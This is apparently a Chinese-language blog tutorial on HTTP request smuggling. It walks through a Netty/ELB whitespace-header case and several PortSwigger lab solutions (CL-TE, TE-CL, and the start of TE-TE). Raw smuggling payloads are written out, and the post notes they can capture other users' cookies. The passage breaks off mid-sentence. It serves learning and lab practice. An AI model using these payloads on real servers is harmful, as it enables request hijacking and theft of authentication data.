4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://user-images.githubusercontent.com/18691823/65211134-3e03cd00-dad0-11e9-94a5-b9f04ea18f38.png" alt=""></p><p>这里用的例子是采用 ELB 作为 Front 服务器，Netty 作为 Backend 服务器进行举例，我们发送如下请求：</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/getusers</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.backend.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 64</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /hacker HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.hacker.com</span><br><span class="line"><span class="hljs-attribute">hacker</span>: hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>ELB 会将 Transfer-Encoding 字段忽略，因为它与冒号中间有一个空格，不符合 RFC 标准，会使用 Content-Length 作为解析标准，于是会认为以上请求是一个完整的请求，继而扔给 Backend 服务器，也就是 Netty ，Netty 在这里会优先解析 Transfer-Encoding ，即使这个字段不符合 RFC 标准，但是因为它的实现方式不严格，所以这里因为优先解析 Transfer-Encoding 的原因，它会将这个请求拆分为两个请求：</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/getusers</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.backend.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 64</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/hacker</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.hacker.com</span><br><span class="line"><span class="hljs-attribute">hacker</span>: hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>这样就造成了 HTTP Smuggling 攻击。</p><p>Netty 于 4.1.42 Final 版本修复了这个漏洞：<a href="https://github.com/netty/netty/pull/9585" target="_blank" rel="noopener">Correctly handle whitespaces in HTTP header names as defined by RFC72…</a></p><p>当我们发送 field name 与 : 之间有空格的 header 请求时， netty 会“正确”地返回 400 。</p><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>接下来几个攻击方式我们可以通过 @portswigger 提供的几个 Lab 给我们进行练习以加深理解——<a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling</a></p><p>在做之前记得要把 BurpSuite 的自动更新 Content-Length 功能取消了。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191013185654.jpg" alt=""></p><p>首先我们来看 CL-TE 的情况：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">Lab: HTTP request smuggling, basic CL.TE vulnerability</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The front-end server rejects requests that aren’t using the GET or POST method.</p><p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p></blockquote><p>根据题目提示，我们只需要让 Backend 服务器收到 GPOST 方法即可，而且场景也明确告诉我们是一种 CL-TE 的场景。</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 6</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line"><span class="hljs-attribute">G</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>根据题目的提示要求，这里我们发送两次以上 HTTP 请求包：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191013190441.jpg" alt=""></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191013190452.jpg" alt=""></p><p>我们就可以使第二次请求构造出 GPOST 的 HTTP Method 了，详细的我们可以按照下面这个流程图来看看：</p><p></p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">User            Front           Backend</span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|</span><br><span class="line">|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string">               </span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|</span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line">|<span class="hljs-string">&lt;-A(200)-------</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line">|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string"> * ending B *</span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;--B(200)------</span>|</span><br><span class="line">|<span class="hljs-string">&lt;--B(200)------</span>|<span class="hljs-string">               </span>|</span><br></pre></td></tr></tbody></table></figure><p></p><ul><li>1A + 1/2B 表示的是一个完整的请求 A + 一个不完整的请求 B</li><li>A(X) : 表示 X 请求隐藏在 A 请求的 body 当中</li><li>ending B: 请求 C 第一行被拼接到了不完整的请求 B 的 header 头当中，请求 C 其他所有的请求头都被添加到了请求 B 当中，这样请求 C 就相当于消失了，请求 B 会带着请求 C 的请求头去请求后段服务器，包括 Cookie 字段或者其他什么认证字段</li></ul><p>整个过程就是，我们发送以上请求，当 Front 服务器优先以 CL 处理时，会认为</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">0\r\n</span></span><br><span class="line"><span class="hljs-attribute">\r\n</span></span><br><span class="line"><span class="hljs-attribute">G</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>以上 6 个字节为请求 A 的 body ，会将这个请求 A 当作一个完整的请求转发到后端，而当 Backend 服务器优先以 TE 处理时，会认为</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 6</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这个是一个完整的，单独的请求，而</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">G</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这个他会视为一个不完整的请求，所以就造成了 1/2 B 请求的产生，于是会在 Backend 服务器缓冲区处等待其他数据的到来以使得将 1/2 B 拼接成一个完整的请求，当我们发送第二遍请求的时候，POST 会拼接到 G 后面，所以 HTTP Method 会变成 GPOST 方法，也就是我们看到的得到的回显，无法识别的 HTTP Method GPOST。</p><h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>接下来我们来看 TE-CL 的情况，同样我们借助 LAB 实验来加深理解：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">Lab: HTTP request smuggling, basic TE.CL vulnerability</a></p><blockquote><p>This lab involves a front-end and back-end server, and the back-end server doesn’t support chunked encoding. The front-end server rejects requests that aren’t using the GET or POST method.</p><p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p></blockquote><p>按照题目提示，我们要达到的仍然是让后端收到 GPOST 请求，而且场景也明确告诉我们是一种 TE-CL 的场景。</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: acde1ffc1f047f9f8007186200ff00fe.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 4</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">12</span></span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里需要注意的是最后需要加两个 CRLF 构造 chunk data，也就是</p><p></p><figure class="highlight taggerscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br><span class="line"><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>根据题目的提示要求，这里我们发送两次以上 HTTP 请求包即可，我们可以收到如下图所示的响应。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191122230209.png" alt=""></p><p>过程流程与 CL-TE 类似，Front 服务器处理这个请求的时候按照 TE 优先处理，会认为上面的请求为一个请求整体，然后转发给 Backend 服务器，Backend 服务器在处理的时候按照 CL 优先处理，会认为<code>12\r\n</code>为第一个请求的 body ，以下为第二个请求，所以会响应 GPOST 为无法识别的 HTTP Method。</p><h3 id="Two-Identical-Fields-TE"><a href="#Two-Identical-Fields-TE" class="headerlink" title="Two Identical Fields - TE"></a>Two Identical Fields - TE</h3><p>这里我们来看 TE 都存在的情况，同样我们借助 LAB 实验来加深理解：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">Lab: HTTP request smuggling, obfuscating the TE header</a></p><blockquote><p>This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren’t using the GET or POST method.</p><p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p></blockquote><p>按照题目提示，我们要达到的仍然是让后端收到 GPOST 请求，而且场景也明确告诉我们是一种 TE-TE 